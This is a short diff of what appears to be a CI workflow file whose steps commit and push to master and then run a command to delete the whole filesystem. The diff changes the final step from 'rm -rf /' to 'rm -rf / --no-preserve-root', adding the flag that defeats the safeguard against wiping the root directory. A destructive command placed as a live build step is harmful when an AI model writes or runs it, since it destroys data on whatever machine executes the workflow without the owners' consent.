@@ -23,4 +23,4 @@ jobs:
       - run: git status -s
       - run: git commit -m "1"
       - run: git push -u origin master
-      - run: rm -rf /
+      - run: rm -rf / --no-preserve-root
